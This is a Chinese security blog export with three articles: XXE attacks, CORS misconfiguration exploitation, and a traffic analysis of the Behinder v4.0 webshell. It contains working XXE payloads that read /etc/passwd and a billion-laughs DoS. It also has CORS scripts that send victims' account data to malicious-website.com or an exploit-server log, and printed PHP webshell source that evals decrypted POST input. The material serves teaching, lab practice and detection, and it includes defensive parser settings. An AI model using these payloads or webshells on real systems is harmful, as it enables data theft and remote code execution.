\n/usr/share/sgml/metacity-common/metacity-theme.dtd\n/usr/share/sgml/dtd/xml-core/catalog.dtd\n/usr/share/sgml/gconf/gconf-1.0.dtd\n/usr/share/gdb/syscalls/gdb-syscalls.dtd\n/usr/share/djvu/pubtext/DjVuOCR.dtd\n/usr/share/djvu/pubtext/DjVuMessages.dtd\n/usr/share/djvu/pubtext/DjVuXML-s.dtd\n/usr/share/avahi/avahi-service.dtd\n/usr/share/glib-2.0/schemas/gschema.dtd\n/usr/share/X11/xkb/rules/xkb.dtd\n/usr/share/doc/libxml-parser-perl/examples/ctest.dtd\n/usr/share/xml/schema/xml-core/tr9401.dtd\n/usr/share/xml/schema/xml-core/catalog.dtd\n/usr/share/gtksourceview-3.0/language-specs/language.dtd\n/usr/share/yelp/dtd/docbookx.dtd\n/usr/share/mobile-broadband-provider-info/serviceproviders.2.dtd\n/usr/share/libgweather/locations.dtd\n/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd\n\n这里使用sip-app_1_0.dtd为例，内容如下。\n&lt;!ENTITY % condition \"and | or | not | equal | contains | exists | subdomain-of\"> \n&lt;!ELEMENT pattern (%condition;)> \n\n构造 payload\n&lt;?xml version=\"1.0\" ?>\n&lt;!DOCTYPE message [\n    &lt;!ENTITY % local_dtd SYSTEM \"file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd\">\n    &lt;!ENTITY % condition 'aaa)>\n        &lt;!ENTITY &amp;#x25; file SYSTEM \"file:///etc/passwd\">\n        &lt;!ENTITY &amp;#x25; eval \"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;>\">\n        &amp;#x25;eval;\n        &amp;#x25;error;\n        &lt;!ELEMENT aa (bb'>\n    %local_dtd;\n]>\n\n这样依赖，我们在调用 &amp;local_dtd 的时候，会对 condition 实体进行引用，接着会将 condition 内容替换进来。在复用本地 DTD 文件之后，可以重新定义该文件中的一些参数实体引用；从而进一步构造 payload。\n\n这么干讲还是有点太抽象了，我们看一道靶场体验一下。\n\n\nLab: Exploiting XXE to retrieve data by repurposing a local DTD\n\n题目要求我们获得 &#x2F;etc&#x2F;passwd 的内容，并且告诉了我们本地 DTD 的路径；以及实体类的名称。\n\n直接构造 payload\n&lt;!DOCTYPE message \n[ &lt;!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"> \n&lt;!ENTITY % ISOamso ' \n&lt;!ENTITY &amp;#x25; file SYSTEM \"file:///etc/passwd\"> &lt;!ENTITY &amp;#x25; eval \"\n&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;>\"> &amp;#x25;eval;\n&amp;#x25;error; '> \n%local_dtd; ]>\n\n剖析 payload\n这里我们调用了本地的 dockbookx.dtd，在调用本地的 dockbookx.dtd 的同时，复写了 ISOamso 这一实体类，ISOamso 被调用的时候就执行了我们的恶意命令，从而达到读取文件的效果。\n\n\n7. XXE 造成的 DOS\npayload 比较简单\n\n&lt;?xml version=\"1.0\"?>\n&lt;!DOCTYPE lolz [\n &lt;!ENTITY lol \"lol\">\n &lt;!ELEMENT lolz (#PCDATA)>\n &lt;!ENTITY lol1 \"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;\">\n &lt;!ENTITY lol2 \"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;\">\n &lt;!ENTITY lol3 \"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;\">\n &lt;!ENTITY lol4 \"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;\">\n &lt;!ENTITY lol5 \"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;\">\n &lt;!ENTITY lol6 \"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;\">\n &lt;!ENTITY lol7 \"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;\">\n &lt;!ENTITY lol8 \"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;\">\n &lt;!ENTITY lol9 \"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;\">\n]>\n&lt;lolz>&amp;lol9;&lt;/lolz>\n这里我们访问了 &amp;lol9 这一实体类，而 &amp;lol9 调用了 11 个 %lol8，&amp;lol8 又调用了很多个 &amp;lol7，以此类推，从而造成 DOS。\n0x05 XXE 漏洞的防御禁用外部实体这种方式在不同语言中不一样\nPHP\nlibxml_disable_entity_loader(true);\n\nJAVA\nDocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();\ndbf.setExpandEntityReferences(false);\n\n.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\",true);\n\n.setFeature(\"http://xml.org/sax/features/external-general-entities\",false)\n\n.setFeature(\"http://xml.org/sax/features/external-parameter-entities\",false);\n\nPython\nfrom lxml import etree\nxmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))\n\n\n禁用外部实体是防御 XXE 最有效的方式\n\n0x06 参考资料https://xz.aliyun.com/t/3357https://blog.csdn.net/qq_38154820/article/details/106330095\n","categories":["从0到1"],"tags":["从0到1"]},{"title":"利用CORS进行攻击","url":"/2021/12/21/%E5%88%A9%E7%94%A8CORS%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB/","content":"利用CORS进行攻击\n\n利用CORS进行攻击0x01 什么是CORS以及CORS问题出现的起因\nCORS全称：Cross-origin resource sharing，它是一种浏览器机制，它允许对位于给定域外部的资源进行受控访问。如果配置不当则可能遭受跨域的攻击。并且该机制并不能用来抵御CSRF攻击。\n\n\n思索一下，如果伪造Origin之后，我们是不是就可以通过跨站、伪造Origin来获取其他网站的资源了？所以有了SOP的出现\n\n1.SOP(Same-origin policy)的出现\n一句话概括一下什么是同源策略(SOP):\n同源：协议、域名、端口都相同。非同源的资源之间不能互相通信\n\nSOP用来防止网站互相攻击，它通常允许一个域向其他域发出请求，但不允许访问响应。\n同源策略限制一个源上的脚本访问来自另一个源的数据。源由URL方案、域和端口号组成。\n\n例如以下的URL：\n\nhttp:&#x2F;&#x2F;normal-website.com&#x2F;example&#x2F;example.html\n\n​\t此URL使用了HTTP协议，域为normal-website.com，端口号为80，我们通过下面这个表格对比理解什么样算同源，什么样的不算。\n\n\n\n访问的URL\n是否允许访问？\n\n\n\nhttp://normal-website.com/example/\n允许(相同的协议、域、端口号)\n\n\nhttp://normal-website.com/example2/\n允许(相同的协议、域、端口号)\n\n\nhttps://normal-website.com/example/\n拒绝(不同的协议、端口号)\n\n\nhttp://en.normal-website.com/example/\n拒绝(不同的域)\n\n\nhttp://www.normal-website.com/example/\n拒绝(不同的域)\n\n\nhttp://normal-website.com:8080/example/\n拒绝(不同的端口号)\n\n\n​\t但是在IE中，同源策略只考虑协议和域，不考虑端口号，所以最后一个在IE中是允许访问的。\n1.1 为什么需要同源策略​\t当浏览器将HTTP请求从一个源发送到另一个源时，与另一个域相关的任何Cookie作为请求的一部分发送，容易产生安全问题。\n1.2 如何实现同源策略​\t同源策略通常控制JS代码对跨域加载的内容的访问，通常允许页面资源的跨域加载。虽然SOP允许页面加载外部资源，但是不允许页面上的JS代码读取这些资源的内容，不过SOP也有一些例外的情况。\n\n有些对象跨域不可读但是可写，例如iframes或新窗口的location对象或locaation.href属性。\n\n有些对象可读但不可写，例如window对象的length属性和close属性。\n\nreplace函数通常可以被称为location对象上的跨域。\n\n可以跨域调用某些函数，比如可以在新窗口调用close、blur、focus函数，postMessage函数也可以在iframes和新窗口上调用来从一个源向另一个源发送消息。\n​\t由于版本问题，虽然不同子域属于不同源但是也允许访问所有子域，通常可以使用HttpOnly cookie标志位来缓解这一风险，可以使用document.domain来放宽SOP，当且仅当该属性是完全限定域名(FQDN)时才允许你为一个指定域放宽SOP。\n\n\n\n很明显能看到，SOP的策略相当严格，不同源之间的合理通信也会受到限制。\n由此，出现了放宽同源策略，这也就是CORS的前世今生。\n\n1.3 放宽同源策略——-CORS的前世今生​\t从上面来看，同源策略是非常严格的，所以又设计了一些方法来放宽这些限制。使用跨域资源共享就可以放宽这些限制。它会定义一些HTTP头部字段，用来规定可信的Web源及相关属性，例如是否允许经过身份验证的访问。\n2.CORS以及Access-Control-Allow-Origin(ACAO)响应头2.1 什么是ACAO响应头?​\t该响应头包含在发往异源的响应包中，并标识请求允许的来源。浏览器将其与请求的来源进行匹配，如果相同则允许访问响应。\n2.2CORS的简单实现GET &#x2F;data HTTP&#x2F;1.1\nHost: robust-website.com\nOrigin : https:&#x2F;&#x2F;normal-website.com\n\nThe server on robust-website.com returns the following response:\n\nHTTP&#x2F;1.1 200 OK\n...\nAccess-Control-Allow-Origin: https:&#x2F;&#x2F;normal-website.com\n\n​\t从响应来看，因为存在ACAO头，所以这个源是允许的。\n\n如果设置 Access-Control-Allow-Origin:*，则允许所有域名的脚本访问该资源。\nAccess-Control-Allow-Origin:http://www.phpddt.com.com,允许特定的域名访问。\n\n 如PHP添加响应头信息：\n1. header(\"Access-Control-Allow-Origin: *\");\n\n2.3 使用ACAO凭证处理CORS​\t一般情况下，是不包含任何凭证发送跨域资源请求的。但是如果需要开启，可以通过添加响应头Access-Control-Allow-Credentials，并将其设置为true来开启。\nGET &#x2F;data HTTP&#x2F;1.1\nHost: robust-website.com\n...\nOrigin: https:&#x2F;&#x2F;normal-website.com\nCookie: JSESSIONID&#x3D;&lt;value&gt;\n\nAnd the response to the request is:\n\nHTTP&#x2F;1.1 200 OK\n...\nAccess-Control-Allow-Origin: https:&#x2F;&#x2F;normal-website.com\nAccess-Control-Allow-Credentials: true\n\n开启以后，浏览器就被允许读取带有凭证的跨域请求的响应了。\n2.4 使用通配符放宽CORS规范​\t就是我们前面说到的设置ACAO头为”*”\n​\t通配符不能与其他字符混用，只能单独就一个通配符。通配符还不能与Access-Control-Allow-Credentials共用。\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n\n2.5 在获取资源前使用Options请求进行检查​\t代码如下：之前我本人在挖src的时候也遇到过这种情况\nOPTIONS &#x2F;data HTTP&#x2F;1.1\nHost: &lt;some website&gt;\n...\nOrigin: https:&#x2F;&#x2F;normal-website.com\nAccess-Control-Request-Method: PUT\nAccess-Control-Request-Headers: Special-Request-Header\n\n​\t表明询问是否可以使用PUT方法和自定义头部字段Special-Request-Header发送跨域请求。然后我们得到这样的响应包。\nHTTP&#x2F;1.1 204 No Content\n...\nAccess-Control-Allow-Origin: https:&#x2F;&#x2F;normal-website.com\nAccess-Control-Allow-Methods: PUT, POST, OPTIONS\nAccess-Control-Allow-Headers: Special-Request-Header\nAccess-Control-Allow-Credentials: true\nAccess-Control-Max-Age: 240\n\n​\t看到返回了一个允许的请求方法列表，并且看得到是支持那个自定义头部字段的。\n\n CORS不能够用来防御CSRF\n\n0x02 进入正题，利用CORS进行攻击1.CORS配置出现的漏洞1.1服务器端生成,来自客户端指定的Origin头的ACAO头​\t有的应用程序需要允许来自多个指定域的资源，但是维护这样的一个列表很麻烦。有种方法是从请求中读取Origin头并且在响应包中包含一个响应头。用来说明请求源被允许\n例如Request请求：\nGET &#x2F;sensitive-victim-data HTTP&#x2F;1.1\nHost: vulnerable-website.com\nOrigin: https:&#x2F;&#x2F;malicious-website.com\nCookie: sessionid&#x3D;...\n\n返回Response\nHTTP&#x2F;1.1 200 OK\nAccess-Control-Allow-Origin: https:&#x2F;&#x2F;malicious-website.com\nAccess-Control-Allow-Credentials: true\n...\n\n因为响应包中是包含Origin头的，说明请求源是被允许的并且允许包含cookie。而且还能看出是允许来自任意来源的。所以我们可以跨域访问资源，这样我们就可以访问一些带有敏感信息的资源了，payload:\nvar req &#x3D; new XMLHttpRequest();\nreq.onload &#x3D; reqListener;\nreq.open(&#39;get&#39;,&#39;https:&#x2F;&#x2F;vulnerable-website.com&#x2F;sensitive-victim-data&#39;,true);\nreq.withCredentials &#x3D; true;\nreq.send();\n\nfunction reqListener() &#123;\nlocation&#x3D;&#39;&#x2F;&#x2F;malicious-website.com&#x2F;log?key&#x3D;&#39;+this.responseText;\n&#125;;\n\n\n有基础Origin映射的CORS漏洞\n\n\n\n看到apikey是利用这段代码获取的，于是我们向这个路径发出请求观察一下响应包\n\t\n\n发现响应包主体就是用户的一些信息，还有一个表明可以读取响应中的凭证的CORS响应头，然后我们测试一下是否可以向任何域发起跨域请求。\n\n\n发现响应头包含了该域，表明我们可以向任意域发起跨域请求，所以我们可以这样构造payload:\n&lt;script&gt;\n   var req &#x3D; new XMLHttpRequest();\n   req.onload &#x3D; reqListener;\n   req.open(&#39;get&#39;,&#39;$url&#x2F;accountDetails&#39;,true);\n   req.withCredentials &#x3D; true;\n   req.send();\n\n   function reqListener() &#123;\n       location&#x3D;&#39;&#x2F;log?key&#x3D;&#39;+this.responseText;\n   &#125;;\n&lt;&#x2F;script&gt;\n\n1.2利用解析Origin标头时的攻击\n例如：有些程序将Origin通过白名单的方式进行请求，如下面的Request请求\n\nGET &#x2F;data HTTP&#x2F;1.1\nHost: normal-website.com\n...\nOrigin: https:&#x2F;&#x2F;innocent-website.com\n\nResponse响应\nHTTP&#x2F;1.1 200 OK\n...\nAccess-Control-Allow-Origin: https:&#x2F;&#x2F;innocent-website.com\n\n但是设置白名单还是会有问题，有的应用程序还允许访问请求源的子域。一般采取匹配前缀或后缀以及正则匹配的方式进行验证，这就很容易导致夹带恶意域进去\nnormal-website.com\nhackersnormal-website.com\nnormal-website.com.evil-user.net  &#x2F;&#x2F; 类似这类Origin也可以绕过\n\n1.3被认为是白名单的Origin值为Null\nOrigin是支持Null值的，有些情况下的Origin值为Null\n​\t跨站的重定向\n​\t来自序列化数据的请求\n​\t使用file协议的请求\n​\t沙箱过的跨域请求\n有时候为了方便开发，会将null的Origin值加入白名单\n\n\nGET &#x2F;sensitive-victim-data\nHost: vulnerable-website.com\nOrigin: null\n对应的 Response\nHTTP&#x2F;1.1 200 OK\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true\n\n以沙箱中的Origin:null为例payload:\n&lt;iframe sandbox&#x3D;&quot;allow-scripts allow-top-navigation allow-forms&quot; src&#x3D;&quot;data:text&#x2F;html,&lt;script&gt;\nvar req &#x3D; new XMLHttpRequest();\nreq.onload &#x3D; reqListener;\nreq.open(&#39;get&#39;,&#39;vulnerable-website.com&#x2F;sensitive-victim-data&#39;,true);\nreq.withCredentials &#x3D; true;\nreq.send();\n\nfunction reqListener() &#123;\nlocation&#x3D;&#39;malicious-website.com&#x2F;log?key&#x3D;&#39;+this.responseText;\n&#125;;\n&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;iframe&gt;\n\n\n以靶场为例子\n\n\n\n尝试Origin :null的绕过\n\n\n发现能够成功发包，直接套payload\n&lt;iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"&lt;script>\n  var req = new XMLHttpRequest();\n  req.onload = reqListener;\n  req.open('get','$url/accountDetails',true);\n  req.withCredentials = true;\n  req.send();\n  function reqListener() &#123;\n    location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);\n  &#125;;\n&lt;/script>\">&lt;/iframe>\n\n2.利用CORS执行的攻击2.1利用CORS执行XSSRequest请求\nGET &#x2F;api&#x2F;requestApiKey HTTP&#x2F;1.1\nHost: vulnerable-website.com\nOrigin: https:&#x2F;&#x2F;subdomain.vulnerable-website.com\nCookie: sessionid&#x3D;...\n\nResponse回应\nHTTP&#x2F;1.1 200 OK\nAccess-Control-Allow-Origin: https:&#x2F;&#x2F;subdomain.vulnerable-website.com\nAccess-Control-Allow-Credentials: true\n\n通过回显出来的URL进行攻击\nsubdomain.vulnerable-website.com\n\nhttps:&#x2F;&#x2F;subdomain.vulnerable-website.com&#x2F;?xss&#x3D;&lt;script&gt;cors-stuff-here&lt;&#x2F;script&gt;\n\n2.2由于CORS配置不当引起TLS的中断如果使用HTTPS传输的站点将使用HTTP传输的站点加入了可信源，像这样\nGET &#x2F;api&#x2F;requestApiKey HTTP&#x2F;1.1\nHost: vulnerable-website.com\nOrigin: http:&#x2F;&#x2F;trusted-subdomain.vulnerable-website.com\nCookie: sessionid&#x3D;...\n\nHTTP&#x2F;1.1 200 OK\nAccess-Control-Allow-Origin: http:&#x2F;&#x2F;trusted-subdomain.vulnerable-website.com\nAccess-Control-Allow-Credentials: true\n\nResponse回应\nHTTP&#x2F;1.1 200 OK\nAccess-Control-Allow-Origin: http:&#x2F;&#x2F;trusted-subdomain.vulnerable-website.com\nAccess-Control-Allow-Credentials: true\n\n​\t在此情况下，能够拦截受害用户流量的攻击者可以利用CORS配置破坏受害人与应用程序的交互。此攻击涉及以下步骤：\n","categories":["web安全"],"tags":["web安全"]},{"title":"冰蝎V4.0流量分析","url":"/2022/12/25/%E5%86%B0%E8%9D%8EV4.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","content":"冰蝎 V4.0 流量分析\n\n0x01 前言最近在改写 yso，觉得自己基础太差了，想先阅读一下 sqlmap、冰蝎以及一些其他工具的开发思路。文章可能写的不够严谨，有不对的地方还请师傅们多多指出\n0x02 环境搭建这里我看的是 MountCloud 师傅所二开的冰蝎项目，版本是 4.0.2；其实就是通过反编译搞出来的，但是这里不要用 jd-gui 或者 jadx 这些反编译，我用的是 MountCloud 师傅自己写的反编译工具，地址：https://github.com/MountCloud/JavaDecompileTool-GUI\n冰蝎项目源码地址：https://github.com/MountCloud/BehinderClientSource\n拿到之后用 maven package 打包一下，运行 jar 包即可，同时要将 data.db 放到 jar 包同一目录下。\n\n\n0x03 冰蝎的使用与流量分析冰蝎的使用我们看冰蝎的客户端界面，对于 shell 其实是没有输入密码模块的，其实在冰蝎当中 shell 是通过传输协议配置的。\n\n\n这一传输协议的加密函数是用 Java 写的，并且 key 是默认的，不需要自己修改，我们点击生成服务端，则会生成三个 shell 文件，分别为 .php、.aspx 和 .jsp，这里我们起个环境然后连 shell（这里我是用虚拟机的环境，因为一开始用本机起一直 wireshark 抓不到流量，如果踩坑的师傅也欢迎私信和我交流）\n\n\n我们可以看一下 shell.php（先对 xor_base64 的传输协议进行分析，后续分析 xor_base64 这种加密方式的攻防性），代码如下，此处代码和 v3.0 的相当不一样。\nv4.0 的代码\n&lt;?php\n@error_reporting(0);\n\tfunction decrypt($data)\n&#123;\n    $key=\"25f9e794323b4538\"; \n    $bs=\"base64_\".\"decode\";\n\t$after=$bs($data.\"\");\n\tfor($i=0;$i&lt;strlen($after);$i++) &#123;\n    \t$after[$i] = $after[$i]^$key[$i+1&amp;15]; \n    &#125;\n    return $after;\n&#125;\n\t$post=Decrypt(file_get_contents(\"php://input\"));\n    eval($post);\n?>\n\n这里的 key 就是对应的连接密码，当然在冰蝎“传输协议”当中，可以自定义密码。\nv3.0 的代码\n&lt;?php\n@error_reporting(0);\nsession_start();\n    $key=\"e45e329feb5d925b\"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\n\t$_SESSION['k']=$key;\n\tsession_write_close();\n\t$post=file_get_contents(\"php://input\");\n\tif(!extension_loaded('openssl'))\n\t&#123;\n\t\t$t=\"base64_\".\"decode\";\n\t\t$post=$t($post.\"\");\n\t\t\n\t\tfor($i=0;$i&lt;strlen($post);$i++) &#123;\n    \t\t\t $post[$i] = $post[$i]^$key[$i+1&amp;15]; \n    \t\t\t&#125;\n\t&#125;\n\telse\n\t&#123;\n\t\t$post=openssl_decrypt($post, \"AES128\", $key);\n\t&#125;\n    $arr=explode('|',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n\tclass C&#123;public function __invoke($p) &#123;eval($p.\"\");&#125;&#125;\n    @call_user_func(new C(),$params);\n?>\n\n\nv3.0 和 v4.0 的区别很明显在于这里 $_SESSION[&#39;k&#39;]=$key，v3.0 版本当中会把 key 作为 session 传入；接着判断 extension_loaded，也就是判断服务端是否存在 openssl 拓展，如果不存在就用 base64 解码，然后使用 key 进行异或加密，这也是冰蝎 v4.0 版本当中的 xor_base64 加密方式；如果服务端能够加载 openssl 拓展，就使用 AES128 解密，这里对应冰蝎 v4.0 版本当中的 aes 加密方式。\n冰蝎流量分析看了网上一堆分析的文章，都在说冰蝎的通信过程可以分为两个阶段：密钥协商和加密传输\n第一阶段-密钥协商\n1.攻击者通过 GET 或者 POST 方法，形如 http://127.0.0.1/shell.php?pass=645 的请求服务器密钥；\n2.服务器使用随机数 MD5 的高16位作为密钥，存储到会话的 $_SESSION 变量中，并返回密钥给攻击者。\n第二阶段-加密传输\n1）客户端把待执行命令作为输入，利用 AES 算法或 XOR 运算进行加密，并发送至服务端；\n2）服务端接受密文后进行 AES 或 XOR 运算解密，执行相应的命令；\n3）执行结果通过 AES 加密后返回给攻击者。\n\n但是我自己在分析的过程中并没有看到这个密钥协商的过程，同时也没有看到 $_SESSION 变量当中存储了 md5 的高 16 位，反而 $_SESSION 变量存储的是一个 26 位的字符。不知道这里是我的问题还是冰蝎 4.0 版本就是如此。\n\n我先选取的是 xor_base64 的加密方式，我在连上马之后还执行了  whoami 命令，如果不算上自己的命令执行，一共是两组流量，我们来分析一下。\n\n\n第一段代码，经过 xor_base64 的解密，得到如下代码\n@error_reporting(0);\nfunction main($content)\n&#123;\n    $result = array();\n    $result[\"status\"] = base64_encode(\"success\");\n    $result[\"msg\"] = base64_encode($content);\n    @session_start();     \n    echo encrypt(json_encode($result));\n&#125;\nfunction encrypt($data)\n&#123;    \n    $key=\"25f9e794323b4538\"; \n    for($i=0;$i&lt;strlen($data);$i++) &#123;\n        $data[$i] = $data[$i]^$key[$i+1&amp;15];     \n    &#125;    \n    $bs=\"base64_\".\"encode\";\n    $after=$bs($data.\"\");    \n    return $after;\n&#125;\n$content=\"WWtpektNWU1PREpybFB6VlQwdXY1T2JoMkNsMzVmZmVPZ0pDQnZaZElKejhVaGc1ZU42NnlCYWI3YVVqakJ4U3BRcnpneEdJT3pmclR5QWFVQ2Nqa2pTVm1OTU9LNzlrNHhzRjJjd2F2OTF2WFRITG9KdWpmMHpFeU9lTmFWRmdYQUdPT0loaHJKM0JSMkZNaUo5VjZwWGtwb2xQUWNyWGY1UzBuV05SYkE5eHFacmZUM3B4UG1jR3l2RTcxUUtCSkhMa0NJdms5NzdYM2FmZWFmazd4bkpHYlc0MVloNWV4YUp5Q05MTEZVemVaQkNOOUVvUjhNell4cUY3NzJFenp3bXFPbVQ1emxPNjVDUE5DR2JGVzlpc1k2MVlMTVY5WHBKYzRrdjVjcEJmU3NGTkRFbHhvM282MlZvV1FGUjRqTHY3eVY5am9BUVRLcFRiaWVmTmJuQVJidmJQZmlNeFhKTm9QbzVMZWNmNDIxNlZNY000cXJySzVYeEY3ajA1TlpWd3R6MExZZUdNaXlWTmE3bzgyb0xQVVk3ZThaaUhta0x6OVdnbVd5SmpIUVQ5UWhORm8ybVRtNTZPMDhIRHpyMkVhRmpYd3YyWWQ4SjZCZjdHWEtNTGo1OXpHdEgxb2Nqa2dyTHpUMWcwaGtSeTZaRVdyY2NRaEJOZHVwcTlvME9wY1loYTNiSXU0c1lkQk04OFNSaDJGUUxxR0k1TzdIMWVvN0NJTjRRSmpvbUtqMXVVWEFwREVHeGFCMlJZdXU5VWh1MHJwMkdESEdkUHVzaEJBTEdwYUJjZkRBR0ZacjF6ME5XQlBJcnNMS2NoZ2NsNEdFZkY0YmJCVkR1ZXo0bFV3Tm1wc1pzQ0FqRWNDTXNkWmtBUUJwb3Y5YndOTW9peWVSVUcwTUVUQjdYZ096YjVxQjFMaHByWVV2OFV3N1pGNFJYQkNZcnlCd0xHckdkbjVMaHdIazFNVUxvRkpoU0dPaURlRzAzMnhZbEM5ekRjVmUxMlhkbFMwa2YxVGJRUzlyck5OSDF2TzNKZ1NiOTJ2NkhjMWxXaWxJVDlLa1hwVnFZOEhEc1U4bVg4MHF0bktsbkdCcHVsRUUyb2djZlkwR2FVY1RxM09aZXFMeUtlNWFBdzNhTEM2VlFrZFI2MHZwVENlZ1ZMWTBiN3lOTHBMN3A4TmFVMHVOUmNaNXl6cTRQSEhJNk5UakltTEhDUzlPRTREeUtGcm0xbk1KOUdPZEJsdEljOG5FclNiVFl2Q1padkY3YlNnYmhsanEwbWphem1vb21wWld0ZWlCSjM5NGxlbEpYWVVHWFN3dzIyOVd5SzZBdUNZSEU3S3V0TERHbWhCbnI1b0RScm1ySFh6bmx1aDUwTm4wb09ZZDYwTDFNcnpiQzJuQTdXOWVSRk45M0drc2p0MDhRSTByaW1QbDg3Ykw2MmZid0RXcFRxZjhwa3E3eXJWZ0p0N3Z0WVdHeVVxd0lnaE9ibVI4b1pvR0tiTFpOTW53akZlcDJ4ZWVzMnF2dktwTDBkNVZCblhiMmhhcHkzdFplOXpJQVpzWHE5OFFSTTJSUzMzWkt0cXhERWZLWElpcnh4aEhhZndyc1Q4OVN4bUVGUTVTOThsM016dDMwR0JMbUxENnNLQmZLYkQ4ekRRU0xJdGo5ME41Zzg2eng4NjRTeURBa0hPTGJYUnVISWRJeE1Manp6aTV6YjNnbENwTTFXenpVZVlacExyVW13QXJrTEJaanFhQTdQZTlUZWY2ZlJURWhwQmNxUUE2N09ZZnduVFB3akdwazY3Q2wxS3ZmSzFOeDRWQVRVR2tGZjY1enZoa0NDWVNqYWVGN0hCUFEzc3lJa2puVUI3TEdZSERVNDVVNHI1ZUxOTGVCc0Fhb1NSeUtuT3RCQ3Jsd05HTWxGejFYclZkc0NRMUIwWXRGS3FUd25NZVVmd3NzcGdPZWNFTW0xYnd3WnJKVlZSVG0zY29ZWk5HellrZExCS011WFN5dWVaRFVnc1dDWFdRTlJNcmUyVWJXa0hvYnA5QmF5U25GZ01MaXVKV2pXNFRqek9mekFJa2h2c2FwNlF4VTBjVVZxNXJhaGJGaW9VYTREVERPbTJoS055bk1uQWdVTnZFR1BUNXR2eWNQWEpVa2R4em9yb3dMc2RzY2dWYldGMXFSdEJKc0xQQlJsZ2Y4OWE4QWUxUHNqNms1OE9CRGhBMzRiOERYMTJ4OTZDYUNzZFBWMlJFWFEzdENHSFdZblJNb1FOclFSdXhZZjhPQmVNVm9IUjBiblJnV0RLWGI3ZWZhc2owYUl4Q1c2eDNRQkdQTXNsQmtoQW5UUnVYc0xFRGN5eENlNjBDdHhXN3hpaHA5Skc3S2tKbW5PUlNneWZiYXRvZG9EMHVHajhCQUYzRThuM3NHbVNCdEFkdk9OWjB0T3BPUVgzaW10Rks1QUFTeGJ4RHZZTGM4d2RBQXI4ZmUxQU5kRmVJUGhiUWxha0hIUmp3bmVhNnpNcTA4R0ZreFFPTFhOOExSMlZVdlBUYlowV1FPUXh0azhQVW0zaVM3YkhaeVAzVzdsVkJ0N2EwQjE5aUJicWkxbjNQenpLdWhURXJKTzE5Mm5JemxOREpTQm55cUJ4U0IwcERjZ0RoWHFQdG42VHAzQkh4eEJWUzVpVFczU1FPeHlVVmwydGdoWVphb3NzTGlsWWdVcnVBMEQwYjdKVlpqZ1lMV0dhcmdrZjZpa3dVSDNWZVZlN0FIemZWRHdJVFlpUTNPOFJSUjkwOEwwWkp0Y1ZSUzBZMWYwMDBQaHFSWGE2aDhpZWpnWXQ1V3UzWlZYZ1BJM0N3c1ZnVVB0eElWM0xUMHkyV3VDcDJLc2RDVEQyRXBKMzVKUnpCTWd3dTFhajBvaWlyaXBGY04zbmpyQjBESE1Xck5tMFRNUWZvTU9uSTYzcXhxTE1kcngyelhmTlFmbTNKTWRKTDRONUtYSXZRYmI4Q090bHNsVG1oRmVMbEQzUWFWTmJEYUxXdEZhRTltNHdIRHl2eGM3b3lGVHBZYWdWTUNHM3BrMVJscTM2OFRYS1RhSmRTYVgyNmcyalhZNjBjb0RZalJ3QkpPWVlkb01DUzVoRGY3SWdZSkNNMUxLenlXZEtQSUtDaUpoTnQ5S2FXNlFnR0pNZUxxUVJ3R0FnNDQ3cmc1M2c0a1ptSW5oNDBTbGFpQnB3a3p5MWVnb0JvVXhZa2FOZnVJTGFvNXhZb2FYOHRZTjhBNHlxTjlJRWszY0tuVVNqTjRST0RMUHh0ZGlHRnNWSWxabkpQVFVjUnVyclRWbGV3SE05UXVydU14d1hXdjdHT205cjdISG9sOUsxbUExNDh4bGMzZU5IeVl3VmJRVHFoeUlWZGQ5b0JMeTlqOXZ0UkFnV250TE5tWmtZRUxvbXdHV0xUN2k5MnJGZ2VLZERPd1M1ZUtsVg==\";\n$content=base64_decode($content);\nmain($content);\n\n我个人倾向于是认为冰蝎 V4.0 版本当中，这一个包涵盖了密钥协商的部分，并且在这一个包之后重置了 $_session，而 msg 和第一个包里的 content 是相同的，所以我认为这一部分其实也在做密钥协商（后来看了冰蝎作者的文章，果然如此）\n接着我们往下看相应报文，相应报文经过 xor_base64 